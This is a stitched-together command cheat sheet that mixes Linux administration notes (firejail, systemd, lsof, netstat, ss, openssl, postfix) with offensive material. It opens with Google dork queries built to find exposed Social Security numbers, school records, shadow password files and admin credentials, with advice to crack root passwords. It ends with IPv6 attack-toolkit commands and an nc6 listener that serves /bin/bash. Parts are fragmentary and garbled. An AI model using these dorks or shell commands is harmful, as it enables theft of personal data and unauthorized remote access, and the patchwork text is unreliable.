http://www.searchengineshowdown.com/features/
http://www.netcraft.com/
http://searchdns.netcraft.com/

http://www.stachliu.com/resources/tools/google-hacking-diggity-project/
http://www.stachliu.com/resources/tools/google-hacking-diggity-project/

##   [+]
filetype:xls SSN DOB johnson OR williams OR brown OR davis OR miller
filetype:xls SSN DOB wilson OR moore OR taylor OR anderson OR thomas
filetype:xls SSN DOB jackson OR white OR harris OR martin OR thompson
filetype:xls SSN DOB garcia OR martinez OR robinson OR clark OR
##   [+] Lists of files from the My Documents folder, including Excel spreadsheets:
intitle:"index of" intitle:"My Documents" xls budget
intitle:"index of" intitle:"My Documents" xls business
intitle:"index of" intitle:"My Documents" xls tax
## The same sort of thing, except let's limit our search to the .us top-level domain and look for files
## or folders named "grades" or "attendance" or "behavior" to try to find sensitive information in school records:
intitle:"index of" intitle:"My Documents" site:us grades OR attendance OR behavior
##   [+] School spreadsheets:
intitle:"index of" intitle:"My Documents" site:us xls
## UNIX systems foolishly serving out their /etc directory, some with the file shadow world-
## readable. Pull out the entry for root out of shadow and use Crack to reverse-engineer their
##   [+] administrative password.
intitle:"index of" intitle:etc shadow passwd nsswitch -man5
##   [+] Database administrator's passwords!
intitle:"Index of" administrators.pwd
##   [+] Filemaker Pro database servers that are way too friendly:
"Select a database to view" intitle:"filemaker pro"
##   [+] Sensitive US military and government documents tend to include "DISTRIBUTION
## RESTRICTION: Distribution is authorized to ... only", so let's look for that:
filetype:pdf "DISTRIBUTION RESTRICTION: Distribution is authorized to" site:.mil
filetype:pdf OR filetype:doc OR filetype:ppt OR filetype:xls
"DISTRIBUTION RESTRICTION:" site:.mil -"approved for public release"

##   [+] Find configurations via Google
ext:txf | ext:cfg | ext:bpf netsniff

site:rapid7.com "set TARGET" Sendmail
site:rapid7.com "use auxiliary" MSSQL

inurl:"smb.conf" intext:"workgroup" filetype:conf
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential


site:s3.amazonaws.com filetype:pdf

intitle:"AXIS 240 Camera Server"
intext:"server push" -help



intitle:"netbotz appliance" "OK" -filetype:pdf

intitle:"SpeedStream Router Management Interface"



inurl:"level/15/exec/~/show"				## Finding  Web  Accessible,  Open  Cisco  Routers


## Exposed Frontpage Credentials
## Using Google to Find Exposed Frontpage Credentials
"# -FrontPage-"filetype:pwd inurl:(service | authors | administrators | users)





related:
inurl:/wp/ site:

filetype:doc inurl:gov intext:"default password"



 * [CIA Vault7 Development Tradecraft DOs and DONTs](https://wikileaks.org/ciav7p1/cms/page_14587109.html)
- [DarkNet Stats](https://dnstats.net/) - Monitors DarkNet Forums & Markets.

- [cuckoo](https://github.com/cuckoosandbox/cuckoo





## ================================================================================== ##
echo "Cloning The Firejail Github Repo..."
## ================================================================================== ##
git clone https://github.com/netblue30/firejail.git
git clone  https://github.com/netblue30/firetools

## ================================================================================== ##
echo "Moving To That Directory..."
## ================================================================================== ##
cd firejail


## ================================================================================== ##
echo "Initiate Firejail Setup Using The Make Compiler..."
## ================================================================================== ##
./configure --enable-apparmor && make && sudo make install-strip


## ================================================================================== ##
echo "Load The Apparmor Kernel Module, Then Compile Into Firejail Source..."
## ================================================================================== ##
./configure --prefix=/usr --enable-apparmor


## ================================================================================== ##
echo "The Apparmor Profile Needs To Be Loaded Into The Kernel..."
## ================================================================================== ##
aa-enforce firejail-default





connecting multiple Firejail
   sandboxes on a virtualized Ethernet network. Applications  include  virtual
   private networks (VPN), overlay networks, peer-to-peer applications.

The tunnel encapsulates Ethernet frames in UDP packets. Each packet is authenticated
independently with BLAKE2 cryptographic hash function (https://blake2.net/).
The keys are derived from a common secret file installed on both client and server.

Compile and install:

git clone https://github.com/netblue30/firetunnel.git
cd firetunnel
./configure && make && sudo make install-strip










firejail --icmptrace

firejail --net.print=
--profile.print=
firejail --protocol=unix,inet
--protocol.print=

firejail --netstats
firejail --nettrace

Monitor  Server  Name  Indication (TLS/SNI)
firejail --snitrace

firejail --trace wget -q www.debian.org
firejail --net=none vlc
--noprinters
--private-cache
--private-tmp

firejail --restrict-namespaces
firejail --restrict-namespaces=user,net
--restrict-namespaces=cgroup,ipc,net,mnt,pid,time,user,uts



firejail --net=eth0 --netlock \
              --private=~/tor-browser_en-US ./start-tor-browser.desktop



firejail --ids-init
firejail --ids-check
/etc/firejail/ids.config


apparmor_parser -r /etc/apparmor.d/firejail-default




cat /etc/xdg/menus/applications.menu






stat --format=%a:%A:%u:%U:%g:%G:%n:%s:%F:%i





There are 14 files in this directory

echo "There are $(ls | wc -w) files in this directory."










##-=================================================================-##
##  [+] Create a directory for the shared or exported filesystem:
##-=================================================================-##

mkdir /var/myshare

##-===============================================================-##
##   [+] Change the permissions to be sure everyone has access:
##-===============================================================-##
chmod -R 777 /var/myshare


##-===================================================-##
##   [+] Enable and start the appropriate services:
##-===================================================-##
rpcbind
nfs-server
nfs-lock
nfs-idmap









apt-cache show bind9 | grep -i status
## Status: install ok installed

systemctl status named | grep -i active
Active: active (running) since Thu 2016–03–17 11:23:48 EDT; 1min
20s ago





##-==============================================-##
##  [+] Use kill to reload configuration files
##-==============================================-##
kill -s SIGHUP $(cat /run/named/named.pid)


ps -ef | grep ^named
ps -ef | grep ^bind
service bind9 status

systemctl enable named
systemctl start named
service bind9 start


named-checkconf /etc/named.conf



service apparmor restart

systemctl enable $Service
systemctl start $Service


##-==============================================-##
##     [+]  List of Active, loaded, and Running Services:
##-==============================================-##
systemctl -a | grep -E '.*\.service.*loaded.*active.*running' | grep -v '@' | awk '{print $1}'




service $Service
service $Service start
service $Service restart
service $Service status
service $Service stop

service  --status-all

service  --status-all | grep -v not running
service  --status-all | grep -v running



service  --status-all





ls /etc/rc.d/rc?.d/$Service
ls /etc/init.d/$Service

chkconfig --level 5 $Service off


chkconfig --level 3 $Service on
chkconfig --level 2345 $Service on			## make a service persistent on more than one runlevel

chkconfig --list $Service


systemctl disable $Service

systemctl disable cups.service
rm '/etc/systemd/system/printer.target.wants/cups.service'
rm '/etc/systemd/system/sockets.target.wants/cups.socket'
rm '/etc/systemd/system/multi-user.target.wants/cups.path'


systemctl status $Service
systemctl list-units --type=service





service network status
systemctl status networking.service -l
networkctl status

journalctl -u systemd-networkd --no-pager | tail -20


*
service






##-================================================-##
##     [+] NULLify NetworkManager Via Null Symlink:
##-================================================-##
systemctl mask NetworkManager.service
ln -s '/dev/null' '/etc/systemd/system/NetworkManager.service'


systemctl unmask NetworkManager.service



##-=================================================-##
##     [+] Hide nm-applet when NetworkManager is disabled
##-=================================================-##
gsettings set org.gnome.nm-applet show-applet false


##-=======================================================-##
##     [+] Show nm-applet when you want to start NetworkManager:
##-=======================================================-##
gsettings set org.gnome.nm-applet show-applet true








/proc/net/ip_conntrack


determines what column to sort by. Options:
--sort

S Source Port
                   d Destination IP (or Name)
                   D Destination Port
                   p Protocol
                   s State
                   t TTL
                   b Bytes
                   P Packets


--no-dns					##  Skip outgoing DNS lookup states







xtables-monitor --trace			##  obtain monitoring trace events


-j  TRACE						##  debug packet traversal to the ruleset


iptables-nft -L

ip6tables-nft -L

arptables-nft -L

ebtables-nft -L

nft list ruleset


iptables-legacy-save > myruleset 		# reads from x_tables
iptables-nft-restore myruleset   			# writes to nf_tables

iptables-legacy-save | iptables-translate-restore | less


xtables-monitor --event				##  Watch for updates to the rule set.

xtables-monitor --trace				##  Watch for trace events generated by packets

xtables-monitor -4				##  Restrict output to IPv4

xtables-monitor -6				##  Restrict output to IPv6

iptables -t raw -A PREROUTING -p tcp --dport 80 --syn -m limit --limit 1/s -j TRACE



( $Syntax )& pid=$!; sleep n; kill -9 $pid		## Run a command and kill it after n seconds





##-===================================================-##
##  [+] Metasploit - gather dns records information
##-===================================================-##
(A, AAAA, CNAME, ZoneTransfer, SRV, TLD, RVL)

msf > use auxiliary/gather/enum_dns



##-===========================================-##
##  [+] Metasploit - Reverse DNS (PTR) Scan
##-===========================================-##

msfconsole
> use auxiliary/gather/dns_reverse_lookup
> set RANGE 192.168.1.0/24
> run



iptables ‐A INPUT ‐p tcp ‐‐dport ident ‐j DROP



network.http.sendRefererHeader to the value 0.
http://moensted.dk/spam/drbcheck.txt
## the best way to determine if a plugin/media type is obeying your proxy settings
## is to use Wireshark to watch network traffic.
## The display filter 'tcp.port== 80 or tcp.port == 443'

http://la-samhna.de/library/rootkits/detect.html



http://brianhill.dyndns.org/site/modules.php?op=modload&name=News&file=article&sid=5&mode=thread&order=0&thold=0
http://packetstorm.security-guide.de/filedesc/wX.tar.html


http://wiki.xensource.com/xenwiki/COWHowTo


--default-new-key-algo


# Encrypt a zipped directory using ssl
tar -zcf - $DIRECTORYIN | openssl aes-256-cbc -salt -out $FILEOUT
 
# Decrypt a zipped directory using ssl
openssl aes-256-cbc -d -salt -in $FILEIN | tar -xz -f -

# Generate password
gpg --gen-random 2 16 | base64



##-=================================================================-##
##  [+] Quickly Encrypt a file with gnupg and email it with mailx
##-=================================================================-##
cat private-file | gpg2 --encrypt --armor --recipient "Disposable Key" | mailx -s "Email Subject" user@email.com


##-===============================================================-##
##  [+] Send a signed and encrypted email from the command line
##-===============================================================-##
echo "SECRET MESSAGE" | gpg -e --armor -s | sendmail USER@DOMAIN.COM


##-===================================================-##
##  [+] Create passwords and store safely with gpg
##-===================================================-##
tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 | gpg -e -r medha@nerdish.de > password.gpg

|gpg -e -r <gpg key id>




##-===================================================-##
##   [+] Generate SHA1 hash for each file in a list
##-===================================================-##
ls $File | xargs openssl sha1


##-===================================================-##
##   [+] Generate SHA1 hash for each file in a list
##-===================================================-##
find . -type f -exec sha1sum {} >> SHA1SUMS \;



##-========================================-##
##   [+] Creating a Certificate Request
##-========================================-##
openssl req -config /etc/mail/certs/mailCA/openssl.cnf -new -nodes -days 1095 -keyout puppy.yourdomaim.com.key.pem -out puppy.yourdomaim.com.csr.pem


##-=============================================-##
##   [+] Generating a 1024 bit RSA private k
##-=============================================-##


##-=========================================-##
##   [+] Signing Your Certificate Request
##-=========================================-##
openssl ca -config /etc/mail/certs/mailCA/openssl.cnf -policy policy_anything -out puppy.yourdomain.com.cert.pem -infiles puppy.yourdomain.com.csr.pem





smtp_tls_cert_file = /path/to/certs/cert.pem
smtp_tls_key_file = /path/to/certs/key.pem
smtp_tls_CAfile = /path/to/certs/CAcert.pem
## You can also add some other options that are useful.
## The first is logging.
## Add the following line to main.cf to enable logging for Postfix as a TSL server:
smtpd_tls_loglevel = 1
## You can also add the following for Postfix TLS client logging:
smtp_tls_loglevel = 1


smtpd_tls_auth_only = yes
Finally, you need to add a line explicitly
##   [+] starting TLS to your main.cf file. For a Postfix
acting as a TLS server, add the following:
smtpd_use_tls = yes
##   [+] For Postfix acting as a TLS client, add the following:
smtp_use_tls = yes



ifconfig -a | grep -E '(^eth|RX.*dropped)'
ethtool -S eth0
ip link show dev eth0

ethtool --show-features eth0
ip address show
ip route show
route −n
ip neigh show

nmcli device status
nmcli dev show


iwconfig eth0 txpower 25
iwlist wlan0 scan
iw dev wlan0 station dump
iwconfig eth0 nwid off
ip link set dev wlan0 address 00:30:65:39:2e:77
ifconfig wlan0 hw ether 00:30:65:39:2e:77


systemctl list-unit-files --type  -services/target



##-============================-##
##   [+] Socket connections
##-============================-##

##-============================-##
##   [+] socket statistics
##-============================-##



##-=============================================-##
##   [+] Show all TCP ports open on a server:
##-=============================================-##
ss -t -a

##-========================================================-##
##   [+] Show established connections with their timers:
##-========================================================-##
ss -t -o



ss -l				## All open ports
ss -x -a			## Unix sockets

##-==========================-##
##  [+] Filter by socket:
##-==========================-##
ss -tn sport = :22


Display all established ssh connections.

ss -o state established '( dport = :ssh or sport = :ssh )'



ss --summary			## Print summary statistics
ss --listening 			## Display only listening sockets
ss --extended			## Show detailed socket information
ss --processes			## Show process using socket
ss --info				## Show internal TCP information
ss --kill				## Attempts to forcibly close sockets
ss --ipv4
ss --ipv6

ss --tcp
ss --udp


List sockets in all states from all socket tables but TCP.
ss -a -A 'all,!tcp'



##-==================================-##
##   [+] Display HTTP connections:
##-==================================-##
ss -o state established '( dport = :http or sport = :http )'



ss -lup | grep domain



ss -tpan 'sport b::b:2'
ss -tup										## List active connections to/from system

ss -tupl									## List internet services on a system


ss -p | cut -f2 -sd\"						## just process names:
ss -p | grep STA							## established sockets only

watch ss -tp                                ## Network connections



##-=================================================================-##
##   [+] Lookup autonomous systems of all outgoing http/s traffic
##-=================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


##-================================================================-##
##   [+] Lookup autonomous systems of outgoing TCP https traffic
##-================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3



netstat -ant
netstat -tulpn
netstat -na | find /i "Listening"
netstat -na | find /c "ESTABLISHED"
netstat -na | find /c "SYN_RECEIVED"
netstat -na 1 | find ":47145" | find /i "Established"
netstat -nao 1 | find "[DestIPaddr]"


netstat -anp --tcp -4 | grep :22
netstat -nao | find ":[port]"
netstat -nao | find ":[port]" | find "[ClientIPaddr]"
netstat -s | awk '/:/ { p = $1 }; (p ~ /^tcp/) { print }'
netstat -s | awk '/:/ { p = $1 }; (p ~ /^Tcp/) { print }'
netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/
netstat -s | awk '/:/ { p = $1 }; (p ~ /^Tcp/) { print }'


netstat -an --inet | grep LISTEN | grep -v 127.0.0.1


dump just the TCP or just the UDP statistics

netstat -s | awk '/:/ { p = $1 }; (p ~ /^Tcp/) { print }'


pull out just the PID of the master SSH daemon:

netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/


Killing that process just requires appropriate use of backticks:
kill `netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/`


We could also use cut to pull out the second field,
if we wanted to shut down the process using its init script:

/etc/init.d/`netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f2
-d/` stop
bash: /etc/



netstat	-­‐antp | grep apache







## ------------------------------------------------------------------------------------------------- ##
	fuser -k /mnt/data			## Kill any processes accessing the file or mount
## ------------------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------------------------- ##
	kill `lsof -t /home`		## Kill all processes that have files open under /home.
## ------------------------------------------------------------------------------------------------- ##
	kill %1						## kill the previous command that was put In the background
## ------------------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------------------------------------------- ##
	pkill -P 1 sshd		# kills only the master sshd process leaving all of the users on the system still logged in.
## ------------------------------------------------------------------------------------------------------------------- ##




Unix server processes almost always end in "d" (think sshd, httpd, ftpd, and so on)

kill `lsof -t -a -i :22 -c /d$/`





continuous mode:

netstat -nac | grep <Mike's IP addr>

The interval for "-c" is interval

while :; do netstat -na | grep <Mike's IP addr>; sleep 5; done


loop option:
watch -n 1 'netstat -na | grep @IPAddr'



watch -n 1 lsof -nPi @IPAddr




lsof -i @

show you all connections related to the specified IP address
port monitoring examples:

watch -n 1 lsof -nPi :47145


SSH connections:
watch -n 1 lsof -nPi tcp@<ipaddr>:22


SSH connections to all IP addresses:
watch -n 1 lsof -nPi tcp:22


"process whack-a-mole" dead easy:

while :; do kill -9 `lsof -t -i :47145`; done



PIDs of the matching processes
kill those processes

while :; do
	pid=`lsof -ti :47145`
	[[ "X$pid" == "X" || "X$pid" == "X$lastpid" ]] && continue
	lastpid=$pid
	echo -n '*** '
	date
	ps e --cols 1600 -fl -p $pid
	lsof -p $pid
done


alias lsof="lsof -FpcfDi\n" >> "$File"



lsof -i -P -n | grep LISTEN && netstat -tulpn | grep LISTEN

ifconfig -a && ip link show && nmcli device status && route -n






##-================================================================-##
##   [+] List the number and type of active network connections
##-================================================================-##
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c



##-=====================================================-##
##   [+] Monitor open connections for httpd
##   [+] including listen, count and sort it per IP
##-=====================================================-##
watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"



##-=========================================-##
##   [+] Kill processes of specific user
##-=========================================-##
kill -9 `lsof -t -u $User`


##-=====================================================-##
##   [+] Kill A Pross Running on Port 8080
##-=====================================================-##
lsof -i :8080 | awk '{I=$2} END {print I}' | xargs kill



##-==================================-##
##  [+] Show 10 Largest Open Files
##-==================================-##
lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail




lsof -p $( pgrep sshd )
lsof -p $( pgrep NetworkManager )
lsof -p $( pgrep firefox )
lsof -p $( pgrep lsof -p $( grep sshd ) )







watch -n 1 lsof -nPi :47145
watch -n 1 lsof -nPi tcp:22
watch --color -n 1 lsof -nPi tcp:443
watch --color -n 1 lsof -nPi tcp:80
watch --color -n 1 lsof -i udp:5353 -t
watch --color -n 1 lsof -iTCP -sTCP:LISTEN
watch --color -n 1 lsof -t -c sshd
watch --color -n 1 lsof -i tcp:ssh
watch --color -n 1 lsof -i tcp:22
watch --color -n 1 lsof -u syslog
watch --color -n 1 lsof +d /var/log
watch --color -n 1 lsof -i udp -u root


grep -i segfault /var/log/*							##  check for buffer overflows in logs
grep -i auth /var/log/* |grep -i failed				##  check authentication failed tries




lsof | grep -e "[[:digit:]]\+w"




##-==========================-##
##   [+] List By Protocol:
##-==========================-##
lsof -i TCP
lsof -i UDP
lsof -i TCP:https


##-==========================-##
##   [+] List By Port Num:
##-==========================-##
lsof -i TCP:$Port
lsof -i TCP:$Port-$Port




for pid in $(lsof ‐i ‐t); do
	lsof ‐a ‐p $pid ‐d txt | awk '/txt/ {print $9}' | head ‐1;
done



for pid in $(lsof ‐i ‐t); do
	lsof ‐a ‐p $pid ‐d txt | awk '/txt/ {print $9}' | head ‐1;
done | sort ‐u | xargs ls ‐l




for pid in $(lsof ‐i ‐t); do
	lsof ‐a ‐p $pid ‐d txt | awk '/txt/ {print $9}' | head ‐1;
done | sort ‐u |
while read exe; do
	echo ===========;
	ls ‐l $exe;
	lsof ‐an ‐i ‐c $(basename $exe);
done



lsof ‐i ‐nlP | awk '{print $1, $8, $9}' | sort ‐u





lsof ‐i ‐nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort ‐u





lsof ‐i ‐nlP | tail ‐n +2 | awk '{print $9, $8}' |
sed 's/.*://' | sort ‐u | tr A‐Z a‐z |
while read port proto; do ufw allow $port/$proto; done









##-==============================================================-##
##   [+] Show apps that use internet connection at the moment
##-==============================================================-##
lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2



##-=====================================================================-##
##   [+] View network activity of any application or user in realtime
##-=====================================================================-##
lsof -r 2 -p $PID -i -a


##-=====================================================================-##

##-=====================================================================-##
lsof -a -p $PID -d txt | awk '/txt/ {print $9}' | head -1;


##-=============================================-##
##   [+] # Show current listening connections:
##-=============================================-##
lsof -Pni4 | grep LISTEN
lsof -nP -i TCP -s TCP:LISTEN
lsof -nP -i | awk '/LISTEN/ {print $2 " " $7 " " $8}'


##-===========================-##
##   [+] Check Connections
##-===========================-##
lsof -i | awk '{print $8}' | sort | uniq -c | grep 'TCP\|UDP'


##-===========================-##
##   [+] Check Established
##-===========================-##
lsof -i | grep ESTABLISHED
lsof -i -nP | grep ESTABLISHED | awk '{print $1, $9}' | sort -u


##-=======================-##
##   [+] Check Active
##-=======================-##
lsof -nP -iTCP -sTCP:ESTABLISHED | grep HTTPS


##-=======================-##
##   [+] Check LISTEN
##-=======================-##
lsof -i | grep LISTEN



##-======================================-##
##   [+] List all files opened by DHCP
##-======================================-##
lsof -c dhcpd


##-============================================-##
##   [+] List the files any process is using
##-============================================-##
lsof +p xxxx


##-============================================-##
##   [+] List paths that process id has open
##-============================================-##
lsof -p $$



lsof -i



##-========================================-##
##   [+] listening tcp sockets
##-========================================-##
lsof -iTCP -sTCP:LISTEN


lsof -nPi | awk '/LISTEN/'



lsof +M -iTCP:814 -iUDP:811


##-================================================-##
##   [+] use awk to parse the output of:
##       > Process name, PID, and process owner
##-================================================-##
lsof -nPi | awk '/LISTEN/ {print $1, $2, $3, $8, $9}'

lsof -i -nlP | awk '{print $1, $8, $9}' | sort -u
lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u


##-====================================================-##
##   [+] list network connections for all processes:
##-====================================================-##
lsof -i[TCP|UDP][@host][:port]


##-====================================================-##
##   [+] list all open files for specific processes:
##-====================================================-##
lsof -p $PID
lsof -c $Command
lsof -c sendmail
lsof -u $Username

lsof +D /var/log/			## List files in directory
lsof +d $Dir				## include subdirectories





lsof -i tcp:ssh
lsof -iTCP:ssh
lsof -t -c sshd
lsof -a -i :22 -c /d$/

lsof -i tcp:22
lsof -i | grep openvpn
lsof -Pni | grep
lsof -i TCP:80

lsof -iTCP:ssh
lsof +M -iTCP:814 -iUDP:811
lsof -iTCP:ssh
lsof -a -c myprog -u tony


## Output all processes that are in "LISTEN" mode

lsof -nPi | awk '/LISTEN/'


rpcinfo -p | egrep -w "port|81[14]"
lsof +M -iTCP:814 -iUDP:811
lsof -iTCP:ssh
lsof -a -c myprog -u tony
lsof ­i TCP ­i UDP


ps --ppid $$

$(pgrep -P $$)



[ "$(sysctl fs.suid_dumpable)" == "fs.suid_dumpable = 0" ] || state=1
[ "$(grep "fs.suid_dumpable" /etc/sysctl.conf /etc/sysctl.d/*.conf | sed -e 's/^.*://' -e 's/\s//g' | uniq)" == "fs.suid_dumpable=0" ] || state=1

[ "$(sysctl kernel.randomize_va_space)" == "kernel.randomize_va_space = 2" ] || state=1
[ "$(grep "kernel.randomize_va_space" /etc/sysctl.conf /etc/sysctl.d/*.conf | sed -e 's/^.*://' -e 's/\s//g' | uniq)" == "kernel.randomize_va_space=2" ] || state=1

[ $(grep "^\s+linux" /boot/grub2/grub.cfg | egrep 'selinux=0|enforcing=0' | wc -l) -eq 0 ] || state=1



##-=====================================================-##
##  [+] STrace - 
##-=====================================================-##
for foo in $(strace -e open lsof -i tcp 2>&1 | grep 'denied'| awk '{print $1}' | cut -d "/" -f3); do echo $foo $(cat /proc/$foo/cmdline)|awk '{if($2) print}'; done



lsof -p NNNN | awk '{print $9}' | grep '.so'

cat /proc/NNNN/maps | awk '{print $6}' | grep '.so' | sort | uniq


strace -e trace=open xtrabackup --prepare --target-dir=2014-11-27_06-06-49
while true; do lsof +D ./2014-11-27_06-06-49 ; sleep 0.1; done




pgrep -u root sshd



tcpkill host ip and port port               ## Block ip:port


tcpkill -i eth0 -9 port $Port

tcpkill -i eth0 -9 host $Host





kill -HUP `lsof -t /usr/sbin/ss`
kill $(lsof -t /home)



lsof -i tcp:ssh
lsof -i tcp:22
lsof -i | grep openvpn
lsof -Pni | grep
lsof -i TCP:80

lsof -iTCP:ssh
lsof +M -iTCP:814 -iUDP:811
lsof -iTCP:ssh
lsof -a -c myprog -u tony


echo "(+)=========================================(+)"
echo "   [+] list all files open on a NFS server	 "
echo "(+)======================================= =(+)"
lsof -N


echo "(+)=============================================(+)"
echo "    [+] Listing Files Open by a Specific Login	 "
echo "(+)=============================================(+)"
lsof -u $User


Ignoring a Specific Login
=============================

lsof ignore the files open to system processes, owned by the root (UID 0) login


lsof -u ^root
    or
lsof -u ^0


lsof | head -10			## Provides the top ten files that are open

lsof | wc -l			## Provides a count of the total number of open files on run

lsof -u root			## Display open file statistics for that particular user



Listing Files Open to a Specific Process Group

lsof -g $GUID -adcwd						## Listing Files Open to a Specific Process Group
						## print process group (PGID) IDs.


lsof -iTCP:3000 -sTCP:LISTEN -n -P will yield the offender so this process can be killed.



function killport() {
  lsof -i tcp:$1 | awk '(NR!=1) && ($1!="Google") && ($1!="firefox") {print $2}' | xargs kill
}


for pid in $(lsof -i -t); do
    lsof -a -p $pid -d txt | awk '/txt/ {print $9}' | head -1;
done | sort -u | xargs ls -l


##-========================================-##
##   [+]
##-========================================-##
while :; do kill -9 `lsof -t -i :47145`; done







##-========================================-##
##   [+]
##-========================================-##
ssh-keygen -t rsa -b 4096 -C 'sysadm' -f ~/.ssh/duh



##-========================================-##
##   [+] Create a new host RSA keys
##-========================================-##
##   [?] do not use a pass-phrase -
##   [?] else you wont be able to connect remotely after a reboot):

ssh-keygen -t rsa -b 4096 -f ssh_host_key -C '' -N ''


##-===============================-##
##   [+] Move them into place:
##-===============================-##
mv ssh_host_key{,.pub} /etc/ssh



##-========================================-##
##   [+] Lock down file permissions:
##-========================================-##
chown root:root /etc/ssh/ssh_host_key{,.pub}

curl -o /etc/ssh/sshd_config https://raw.githubusercontent.com/drduh/config/master/sshd_config






Upload the disk image you have saved remotely over SSH to the new Linode. Replace `192.0.2.9` with the Linode's IP address and `/home/archive/linode.img` with the disk images's path.

dd if=~/$File.img | ssh root@192.0.2.9 "dd of=/dev/sda"



autossh -M 0 -f -q -N -o "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -i "$KEY" -L 3306:127.0.0.1:3306 $REVERSE_TUNNEL $SSH_USERNAME@$SERVERNAME




##-====================================================-##
##   [+]
##-====================================================-##
arp-scan --interface=eth0 192.168.0.0/24


## IP Network scanning


# ARP Scan
arp-scan 192.168.50.8/28 -I eth0




### arping
-----------------------
send ARP request
-i interface -S SIP -s smac -W interval (sec) -c number of probes\
arping -i vlan123 -S 192.168.11.106 -s 54:b2:03:08:4e:d1 192.168.11.1 -W0.09 -c 10

send GARP (unsolicited ARP request)\
arping -U -i [iface] -S 1.2.3.4

bash for loop to iterate through many

for i in $(cat ip_addr.txt); do arping -U -i eth0 -S $1; done







##-========================================-##
##   [+]
##-========================================-##
strace -f -ff -o $File


##-====================================-##
##   [+] trace network system calls:
##-====================================-##
strace -e trace=network,read,write


##-====================================-##
##   [+] trace all Nginx processes
##-====================================-##
strace -e trace=network -p `pidof nginx | sed -e 's/ /,/g'`










##-=======================-##
##  [+] IPv6 Pentesting:
##-=======================-##

MITM-Spoofed-ICMPv6-Neighbor-Advertisement
MITM-Spoofed-ICMPv6-Router-Advertisement
IPv6-Smurf-Attack
IPv6-Smurf-Attack-Details+Duplicate-Address-Detection
IPv6-Duplicate-Address-Detection

##-======================================-##
##  [+] IPv6 Domain Name Servers (DNS):
##-======================================-##
host -t AAAA $Domain
dig -6 AAAA $Domain
dig -x $IPv6IP
nslookup -query=AAAA $Domain


##-=========================-##
##  [+] IPv6 IP Addresses:
##-=========================-##
netstat -A inet6
ifconfig | grep inet6		## Show IPv6 IP
ip -6 addr					## Show IPv6 IP


##-=======================-##
##  [+] IPv6 Traceroute:
##-=======================-##
traceroute6 $Domain
path6 -v -u 72 -d $Domain		## Traceroute EH-enabled
mtr -6 $Domain
tracepath6 $Domain


##-=================================-##
##  [+] IPv6 Neighbor Networking:
##-=================================-##
ip -6 neigh show			## Display neighbor cache
ip -6 neigh flush			## Flush neighbor cache


##-===================-##
##  [+] IPv6 Routes:
##-===================-##
ip -6 route
netstat -rnA inet6
route -A inet6



nmap -6 -sT $DOMAIN						## Nmap scan
nmap -6 -sT ::1							## localhost

scan6 -v -i eth0 -­d $DOMAIN/64			## Domain scanning
scan6 -v -i eth0 -­d $IPv6ADDR/64			## Address scanning

scan6 -i eth0 -L -e --print-type global	## Discover global & MAC addresses

scan6 -i eth0 --local-scan --rand-src-addr --verbose		## Link-local & Global addresses :+1:



tcpdump -i eth0 -evv ip6 or proto ipv6

ip6tables -L -v --line-numbers


##-===================-##
##  [+] IPv6 NETCAT:
##-===================-##
nc6 -lp 12345 -v -e "/bin/bash"		## Listen
nc6 localhost 12345					## Connect


ssh -6 $User@$IPv6ADDR%eth0
telnet $IPv6ADDR $PORT



##-================================================-##
##   [+] The Hacker Choices IPv6 Attack Toolkit:
##-================================================-##


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##

##-===========================-##
##   [+] Probing Neighbors
##-===========================-##
netdiscover -i eth0         ## IPv4
ping6 ff02::1%eth0          ## IPv6


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
na6 -i eth0 --accept-target $TargetIP --listen -E $MAC --solicited --override --verbose


##-====================================================-##
##   [+]
##-====================================================-##

ping6 ff02::2%eth0			## all routers address
ping6 ff02::1%eth0			## all nodes address

ping6 ff02::1%eth0
ping6 -c 6 ff02::1%eth0
ping6 –c 4 fe80::c418:2ed0:aead:cbce%eth0


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
inverse_lookup6 eth0 $MAC		## Get IPv6 from a MAC addresses



ICMPv6 Router Discovery

atk6-redir6


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##


##-=============================================================-##
##   [+] dnsdict6 - Enumerate a domain for DNS Record Entries
##-=============================================================-##
## --------------------------------------------------------------------- ##
##   [?] ENUMERATE SRV SERVICE RECORDS
##   [?] ENUMERATE IPV4 IPV6, NAME SERVER, MAIL SERVER WITH OPTIONS
## --------------------------------------------------------------------- ##
atk6-dnsdict6 $Domain
atk6-dnsdict6 -d $Domain				## NS and MX DNS domain information
atk6-dnsdict6 -S $Domain				## perform SRV service name guessing
atk6-dnsdict6 -d46 -t 32 $Domain		## number of threads




##-====================================================-##
